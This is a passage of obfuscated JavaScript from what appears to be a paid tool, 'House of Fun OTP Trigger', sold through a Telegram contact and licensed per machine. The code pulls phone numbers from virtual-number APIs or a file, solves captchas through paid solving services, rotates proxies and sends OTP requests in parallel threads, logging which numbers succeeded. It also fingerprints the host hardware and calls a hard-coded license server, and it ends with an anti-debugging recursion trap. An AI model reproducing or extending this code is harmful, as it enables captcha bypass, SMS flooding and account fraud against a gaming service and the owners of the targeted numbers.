                    const v447 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                      'name': "✏️ Custom File Path",
                      'value': "custom"
                    }, {
                      'name': "⬅️ Go Back to Number Source",
                      'value': "back"
                    }]);
                    if (v447 === "back") {
                      v355 = 0x2;
                      continue;
                    }
                    if (v447 === "custom") {
                      const v448 = await promptText("Enter Numbers File Path:", "numbers.txt");
                      if (v448.toLowerCase() === "back") continue;
                      v357 = v448;
                    } else v357 = v447;
                    if (!fs.existsSync(v357)) fs.writeFileSync(v357, '');
                    v358 = null, v355 = 0x4;
                  } else {
                    let v449 = '',
                      v450 = [],
                      v451 = 0x32,
                      v452 = "/api/v1/numbers/get",
                      v453 = 0x1,
                      v454 = false;
                    while (v453 <= 0x4 && !v454) {
                      process.stdout.write("[2J[H"), printHeader();
                      if (v453 === 0x1) {
                        if (fs.existsSync(v366)) {
                          const v455 = fs.readFileSync(v366, "utf8").trim(),
                            v456 = {};
                          v456.name = "Yes, use saved key", v456.value = "yes";
                          const v457 = {};
                          v457.name = "No, enter new key", v457.value = 'no';
                          const v458 = {};
                          v458.name = "Delete saved key", v458.value = "delete";
                          const v459 = {};
                          v459.name = "⬅️ Go Back", v459.value = "back";
                          const v460 = await selectOption("Found saved API Key (..." + v455.slice(-4) + "). Use it?", [v456, v457, v458, v459]);
                          if (v460 === "back") {
                            v454 = true;
                            break;
                          }
                          if (v460 === "yes") v449 = v455;else v460 === "delete" && (fs.existsSync(v366) && fs.unlinkSync(v366), v449 = '');
                        }
                        if (!v449) {
                          const v461 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                          if (v461.toLowerCase() === "back") {
                            v454 = true;
                            break;
                          }
                          v449 = v461;
                          const v462 = {};
                          v462.name = "Yes, save it", v462.value = "yes";
                          const v463 = {};
                          v463.name = 'No', v463.value = 'no';
                          const v464 = await selectOption("Save this key for future use?", [v462, v463]);
                          if (v464 === "yes" && v449) fs.writeFileSync(v366, v449, "utf8");
                        }
                        if (v449) v453 = 0x2;
                      } else {
                        if (v453 === 0x2) {
                          v450 = [];
                          let v465 = true;
                          while (v465) {
                            const v466 = await promptText("Enter range #" + (v450.length + 0x1) + " (e.g. 21624485XXX) or type 'back':", '');
                            if (v466.toLowerCase() === "back") {
                              if (v450.length === 0x0) {
                                v453 = 0x1;
                                break;
                              } else {
                                v450.pop();
                                continue;
                              }
                            }
                            if (v466) v450.push(v466);
                            const v467 = {};
                            v467.name = "Yes, add another range", v467.value = "yes";
                            const v468 = {};
                            v468.name = "No, proceed to next step", v468.value = 'no';
                            const v469 = {};
                            v469.name = "⬅️ Go Back to API Key", v469.value = "back";
                            const v470 = await selectOption("Added " + v450.length + " range(s). Add another?", [v467, v468, v469]);
                            if (v470 === "back") {
                              v453 = 0x1;
                              break;
                            }
                            if (v470 === 'no') v465 = false;
                          }
                          if (v450.length > 0x0) v453 = 0x3;
                        } else {
                          if (v453 === 0x3) {
                            const v471 = await promptText("How many numbers to process? [default: 50]:", '50');
                            if (v471.toLowerCase() === "back") {
                              v453 = 0x2;
                              continue;
                            }
                            v451 = parseInt(v471) || 0x32, v453 = 0x4;
                          } else {
                            if (v453 === 0x4) {
                              const v472 = {};
                              v472.name = "Server 2 (/p2/get)", v472.value = "/api/v1/numbers/p2/get";
                              const v473 = {};
                              v473.name = "Server 3 (/p3/get)", v473.value = "/api/v1/numbers/p3/get";
                              const v474 = await selectOption("SELECT NEXA SERVER", [{
                                'name': "Server 1 (/get)",
                                'value': "/api/v1/numbers/get"
                              }, v472, v473, {
                                'name': "⬅️ Go Back",
                                'value': "back"
                              }]);
                              if (v474 === "back") {
                                v453 = 0x3;
                                continue;
                              }
                              v452 = v474;
                              const v475 = {};
                              v475.apiKey = v449, v475.ranges = v450, v475.totalCount = v451, v475.serverEndpoint = v452, v358 = v475, v453 = 0x5;
                            }
                          }
                        }
                      }
                    }
                    if (v454) {
                      v355 = 0x2;
                      continue;
                    }
                    v355 = 0x4;
                  }
                }
              }
            }
          } else {
            if (v355 === 0x4) {
              const v476 = {};
              v476.name = "⬅️ Go Back to Numbers Selection", v476.value = "back";
              const v477 = await selectOption("SELECT PROXIES FILE", [{
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "🚫 None (Direct Connection)",
                'value': "none"
              }, v476]);
              if (v477 === "back") {
                v355 = 0x3;
                continue;
              }
              if (v477 === "custom") {
                const v478 = await promptText("Enter Proxies File Path:", "proxies.txt");
                if (v478.toLowerCase() === "back") continue;
                v362 = v478;
              } else v477 === "none" ? v362 = '' : v362 = v477;
              v355 = 0x5;
            } else {
              if (v355 === 0x5) {
                const v479 = {};
                v479.name = "5  Threads  (Slow — best with captcha cost)", v479.value = 0x5;
                const v480 = {};
                v480.name = "10 Threads", v480.value = 0xa;
                const v481 = {};
                v481.name = "20 Threads (Default)", v481.value = 0x14;
                const v482 = {};
                v482.name = "50 Threads (Fast)", v482.value = 0x32;
                const v483 = {};
                v483.name = "⌨️  Custom...", v483.value = "custom";
                const v484 = {};
                v484.name = "⬅️  Go Back to Proxies Selection", v484.value = "back";
                const v485 = await selectOption("SELECT THREADS", [v479, v480, v481, v482, v483, v484]);
                if (v485 === "back") {
                  v355 = 0x4;
                  continue;
                }
                if (v485 === "custom") {
                  const v486 = await promptText("Enter custom number of threads:", '20');
                  if (v486.toLowerCase() === "back") continue;
                  v363 = parseInt(v486) || 0x14;
                } else v363 = v485;
                v355 = 0x6;
              } else {
                if (v355 === 0x6) break;
              }
            }
          }
        }
      }
    }
    process.stdin.pause();
    return {
      'numbersFile': v357,
      'threads': String(v363),
      'proxiesFile': v362,
      'nexaConfig': v358,
      'twoOoConfig': v361,
      'smsBowerConfig': v359,
      'zenexConfig': v360,
      'captchaProvider': v364,
      'captchaKey': v365
    };
  }
  function generateHWID() {
    const v487 = require('os');
    const v488 = v487.platform();
    try {
      if (v488 === "win32") {
        const v489 = {};
        v489.stdio = "pipe", v489.timeout = 0x3a98;
        const v490 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', v489).toString().trim();
        if (!v490) throw new Error("No hardware data");
        const v491 = crypto.createHash("sha256").update(v490).digest("hex").toUpperCase();
        return "SKING-" + v491.substring(0x0, 0x8) + '-' + v491.substring(0x8, 0xc) + '-' + v491.substring(0xc, 0x10);
      } else {
        let v492 = [];
        try {
          const v496 = {};
          v496.stdio = "pipe", v496.timeout = 0x1388;
          const v497 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", v496).toString().trim();
          if (v497 && v497 !== "null") v492.push('A:' + v497);
        } catch (v498) {}
        try {
          if (fs.existsSync("/proc/cpuinfo")) {
            const v499 = fs.readFileSync("/proc/cpuinfo", "utf8"),
              v500 = v499.match(/Serial\s*:\s*(\S+)/i),
              v501 = v499.match(/Hardware\s*:\s*(.+)/i);
            if (v500 && v500[0x1] !== "0000000000000000") v492.push('S:' + v500[0x1].trim());
            if (v501) v492.push('H:' + v501[0x1].trim());
          }
        } catch (v502) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const v503 = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (v503) v492.push('M:' + v503);
          }
        } catch (v504) {}
        try {
          const v505 = v487.cpus(),
            v506 = v505 && v505.length > 0x0 ? v505[0x0].model : "UnknownCPU",
            v507 = v487.totalmem(),
            v508 = v487.release(),
            v509 = v487.hostname();
          v492.push('F:' + v506 + '|' + v507 + '|' + v508 + '|' + v509);
        } catch (v510) {}
        const v493 = v492.join('||'),
          v494 = crypto.createHash("sha256").update(v493).digest("hex").toUpperCase(),
          v495 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
        return v495 + v494.substring(0x0, 0x8) + '-' + v494.substring(0x8, 0xc) + '-' + v494.substring(0xc, 0x10);
      }
    } catch (v511) {
      return '';
    }
  }
  function verifyServerSignature(v512, v513) {
    if (!v513) return false;
    try {
      return crypto.verify(null, Buffer.from(v512, "utf8"), "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----", Buffer.from(v513, "base64"));
    } catch (v514) {
      return false;
    }
  }
  async function start() {
    const v515 = generateHWID();
    !v515 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
    const v516 = generateHWID();
    v516 !== v515 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("House of Fun OTP Trigger     ") + W('│'));
    console.log(W("│ [•] Your HWID : ") + C(v515.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v517 = false;
    const v518 = Date.now();
    try {
      const v546 = require("http"),
        v547 = await new Promise((v548, v549) => {
          const v550 = {};
          v550.hwid = v515;
          v550.app_id = "houseoffun", v550.version = "1.0.0", v550.timestamp = v518;
          const v551 = JSON.stringify(v550),
            v552 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/verify",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v551)
              },
              'timeout': 0x2710
            },
            v553 = v546.request(v552, v554 => {
              let v555 = '';
              v554.on("data", v556 => v555 += v556), v554.on("end", () => {
                try {
                  v548(JSON.parse(v555));
                } catch (v557) {
                  v549(v557);
                }
              });
            });
          v553.on("error", v549), v553.on("timeout", function () {
            this.destroy(), v549(new Error("Timeout"));
          });
          v553.write(v551);
          v553.end();
        });
      if (v547) {
        v547.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
        if (v547.status === "banned" || v547.status === "expired" || !v547.sig) {
          await new Promise(v561 => setTimeout(v561, 0x7d0));
          let v560 = String(v547.reason || "NOT REGISTERED");
          if (!v547.reason && !v547.sig) v560 = "NOT REGISTERED / REMOVED";
          console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — HOF TOOL       ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v515.padEnd(0x21)) + R('║')), console.error(R("  ║  Status : " + v560.padEnd(0x1a) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
        }
        const v558 = v515 + "|houseoffun|1.0.0|" + v518;
        !verifyServerSignature(v558, v547.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
        v517 = true;
        let v559 = v547.token;
        !v559 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(0x1)), setInterval(() => {
          !v559 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(0x1));
          const v562 = {};
          v562.hwid = v515, v562.app_id = "houseoffun", v562.token = v559;
          const v563 = JSON.stringify(v562),
            v564 = {
              'hostname': "188.137.176.163",
              'port': 0xec1,
              'path': "/api/ping",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v563)
              },
              'timeout': 0x1388
            },
            v565 = v546.request(v564, v566 => {
              let v567 = '';
              v566.on("data", v568 => v567 += v568);
              v566.on("end", () => {
                try {
                  const v569 = JSON.parse(v567);
                  v569.status === 'ok' && v569.token ? v559 = v569.token : (console.error(R("\n  ✗ Session invalidated by server. Exiting...\n")), process.exit(0x1));
                } catch (v570) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(0x1);
                }
              });
            });
          v565.on("error", () => {
            console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
            process.exit(0x1);
          });
          v565.on("timeout", function () {
            this.destroy();
            console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(0x1);
          }), v565.write(v563), v565.end();
        }, 0xafc8);
      }
    } catch (v571) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(0x1);
    }
    !v517 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
    const v519 = process.argv.slice(0x2).filter(v572 => !v572.startsWith('--')),
      v520 = process.env.SKING_UI === '1' || !process.stdin.isTTY || v519.length >= 0x1;
    let v521 = v519,
      v522 = null,
      v523 = null,
      v524 = null,
      v525 = null,
      v526 = "anticaptcha",
      v527 = '';
    if (!v520 && v521.length === 0x0) {
      const v573 = await interactiveWizard();
      v521 = [v573.numbersFile, v573.threads, v573.proxiesFile], v522 = v573.nexaConfig || null, v523 = v573.twoOoConfig || null, v524 = v573.smsBowerConfig || null, v525 = v573.zenexConfig || null, v526 = v573.captchaProvider, v527 = v573.captchaKey;
    } else {
      v526 = process.env.HOF_CAPTCHA_PROVIDER || "anticaptcha", v527 = process.env.HOF_CAPTCHA_KEY || '';
      if (!v527) {
        const v574 = v526 === "anticaptcha" ? ANTICAPTCHA_KEY_FILE : TWOCAPTCHA_KEY_FILE;
        if (fs.existsSync(v574)) v527 = fs.readFileSync(v574, "utf8").trim();
      }
      !v527 && (console.error(R("\n  ✗ No captcha API key found. Set HOF_CAPTCHA_KEY env var or run interactively.\n")), process.exit(0x1));
    }
    let v528 = path.resolve(v521[0x0] || "numbers.txt"),
      v529 = parseInt(v521[0x1]) || 0x14,
      v530 = v521[0x2] !== undefined ? v521[0x2] : "proxies.txt";
    if (v530.toLowerCase() === "none") v530 = '';
    const v531 = generateHWID();
    v531 !== v515 && (console.error(R("\n  ✗ CRITICAL: Runtime memory injection detected. HWID mismatch. Aborting...\n")), process.exit(0x1));
    printHeader(), console.log(B("  ✓ License: Licensed") + G(" | HWID: " + v515)), console.log(B("  ✓ Captcha: " + (v526 === "anticaptcha" ? "AntiCaptcha" : "2Captcha")));
    const v532 = v522 || v523 || v524 || v525;
    let v533 = [];
    !v532 && (!fs.existsSync(v528) && (console.error(R("✗ Error: Numbers file not found: " + v528)), process.exit(0x1)), v533 = fs.readFileSync(v528, "utf8").split(/\r?\n/).map(v575 => v575.trim()).filter(v576 => v576.length > 0x5));
    let v534 = [];
    if (v530 && fs.existsSync(v530)) v534 = fs.readFileSync(v530, "utf8").split('\x0a').map(v577 => v577.trim()).filter(v578 => v578.length > 0x0);
    let v535 = v534.map(parseProxy).filter(Boolean);
    if (v532) {
      const v579 = v522 ? "NexaOTP" : v523 ? v523.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v524 ? "📱 SMS Bower" : "⚡ Zenex";
      console.log(C("✓ Target  : " + v579 + " API (" + v532.totalCount + " numbers)"));
    } else console.log(C("✓ Loaded " + v533.length + " targets"));
    if (v535.length === 0x0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v535.length));
    console.log(C("✓ Threads : " + v529 + '\x0a')), fs.writeFileSync("successful.txt", ''), fs.writeFileSync("failed.txt", ''), fs.writeFileSync("debug.txt", "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v536 = new Dashboard(v532 ? v532.totalCount : v533.length);
    let v537 = [],
      v538 = [],
      v539 = 0x0,
      v540 = false;
    if (v522 || v523) {
      const v580 = v522 ? "NexaOTP" : v523.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
      console.log(Y("\n  [" + v580 + "] Streaming " + v532.totalCount + " numbers (" + v532.ranges.length + " range(s))...")), (async () => {
        let v581 = 0x0,
          v582 = '';
        try {
          for (let v583 = 0x0; v583 < v532.totalCount; v583++) {
            try {
              const v584 = v532.ranges[Math.floor(Math.random() * v532.ranges.length)];
              let v585;
              if (v522) v585 = await nexaLimiter.enqueue(() => nexaFetchNumber(v522.apiKey, v584, v522.serverEndpoint));else v585 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v523.apiKey, v584, v523.getPath));
              if (v585) {
                v539++, v581 = 0x0;
                if (v538.length > 0x0) v538.shift()(v585);else v537.push(v585);
              }
            } catch (v586) {
              v582 = v586.message;
              if (v586.message.includes("Insufficient balance")) {
                console.error(R("\n  [" + v580 + "] ✗ Insufficient balance.\n"));
                break;
              }
              if (v586.message.includes("No numbers available")) continue;
              v581++;
              if (v581 >= 0x5 && v539 === 0x0) {
                console.error(R("\n  [" + v580 + "] ✗ 5 consecutive failures. Last: " + v582 + '\x0a'));
                break;
              }
            }
          }
        } finally {
          if (v539 === 0x0) console.error(R("\n  [" + v580 + "] ✗ No numbers fetched. Last: " + (v582 || "Unknown") + '\x0a'));
          v540 = true;
          while (v538.length > 0x0) v538.shift()(null);
        }
      })();
    } else {
      if (v524) {
        const v587 = v524;
        console.log(Y("\n  [📱 SMS Bower] Streaming " + v587.totalCount + " numbers...")), (async () => {
          let v588 = 0x0;
          try {
            for (let v589 = 0x0; v589 < v587.totalCount; v589++) {
              try {
                const {
                  phoneNumber: v590
                } = await smsBowerFetchNumber(v587.apiKey, v587.service, v587.country, v587.maxPrice);
                v539++, v588 = 0x0;
                if (v538.length > 0x0) v538.shift()(v590);else v537.push(v590);
              } catch (v591) {
                v588++;
                if (v588 >= 0x5 && v539 === 0x0) break;
                await new Promise(v592 => setTimeout(v592, 0x7d0));
              }
            }
          } finally {
            v540 = true;
            while (v538.length > 0x0) v538.shift()(null);
          }
        })();
      } else {
        if (v525) {
          const v593 = v525;
          console.log(Y("\n  [⚡ Zenex] Streaming " + v593.totalCount + " numbers (" + v593.ranges.length + " range(s))...")), (async () => {
            let v594 = 0x0;
            try {
              for (let v595 = 0x0; v595 < v593.totalCount; v595++) {
                try {
                  const v596 = v593.ranges[Math.floor(Math.random() * v593.ranges.length)],
                    v597 = await zenexFetchNumber(v593.apiKey, v596);
                  v539++, v594 = 0x0;
                  if (v538.length > 0x0) v538.shift()(v597);else v537.push(v597);
                } catch (v598) {
                  v594++;
                  if (v594 >= 0x5 && v539 === 0x0) break;
                  await new Promise(v599 => setTimeout(v599, 0x7d0));
                }
              }
            } finally {
              v540 = true;
              while (v538.length > 0x0) v538.shift()(null);
            }
          })();
        }
      }
    }
    const v541 = !!(v522 || v523 || v524 || v525),
      v542 = v541 ? () => {
        if (v537.length > 0x0) return Promise.resolve(v537.shift());
        if (v540) return Promise.resolve(null);
        return new Promise(v600 => v538.push(v600));
      } : () => {
        if (v533.length === 0x0) return Promise.resolve(null);
        const v601 = Math.floor(Math.random() * v533.length);
        return Promise.resolve(v533.splice(v601, 0x1)[0x0]);
      },
      fn9 = () => {
        if (v535.length === 0x0) return null;
        const v602 = v535[Math.floor(Math.random() * v535.length)];
        return rotateSessionId(v602);
      };
    function fn10(v603) {
      try {
        if (v541) return;
        const v604 = fs.readFileSync(v528, "utf8"),
          v605 = v604.split(/\r?\n/).filter(v606 => v606.trim() !== v603.trim()).join('\x0a');
        fs.writeFileSync(v528, v605);
      } catch (v607) {}
    }
    const v543 = v541 ? Math.min(v529, v532.totalCount) : Math.min(v529, v533.length),
      v544 = [],
      v545 = setInterval(() => v536.render(), 0x1f4);
    async function fn11(v608) {
      while (true) {
        const v609 = await v542();
        if (!v609) break;
        try {
          v536.setStatus("Worker " + v608 + ": [1/2] Solving captcha...");
          let v610 = '',
            v611 = '';
          try {
            const v613 = await solveCaptcha(v526, v527);
            v610 = v613.captchaToken, v611 = v613.activeUA;
          } catch (v614) {
            v536.failed++, v536.processed++, fn10(v609);
            const v615 = v614.message || String(v614);
            fs.appendFileSync("failed.txt", normalizePhoneNumber(v609) + "|Captcha solve failed: " + v615 + '\x0a'), v536.addLog("Failed on " + v609 + ": Captcha: " + v615, "error");
            continue;
          }
          v536.setStatus("Worker " + v608 + ": [2/2] Sending OTP to " + v609 + "...");
          const v612 = await sendOTPWithToken(v609, v610, v611, fn9());
          fn10(v609);
          if (v612.success) {
            v536.successful++, v536.processed++;
            const v616 = v612.verificationId ? v612.phone + "|OTP_SENT|" + v612.verificationId + '\x0a' : v612.phone + "|OTP_SENT\n";
            fs.appendFileSync("successful.txt", v616), v536.addLog("Triggered OTP for " + v612.phone, "success");
          } else v536.failed++, v536.processed++, fs.appendFileSync("failed.txt", v612.phone + '|' + v612.message + '\x0a'), v536.addLog("Failed on " + v612.phone + ':\x20' + v612.message, "error");
        } catch (v617) {
          v536.failed++, v536.processed++, fn10(v609), v536.addLog("Fatal error on " + v609 + ':\x20' + v617.message, "error");
        }
      }
    }
    for (let v618 = 0x0; v618 < v543; v618++) v544.push(fn11(v618));
    await Promise.all(v544), clearInterval(v545), v536.render(), v536.stop();
    if (v520) process.exit(0x0);
  }
  start().catch(v619 => {
    console.error(R("Fatal error: " + v619.message)), process.exit(0x1);
  });
}
function fn2(v620) {
  function fn12(v621) {
    fn12(++v621);
  }
  try {
    if (v620) return fn12;else fn12(0x0);
  } catch (v622) {}
}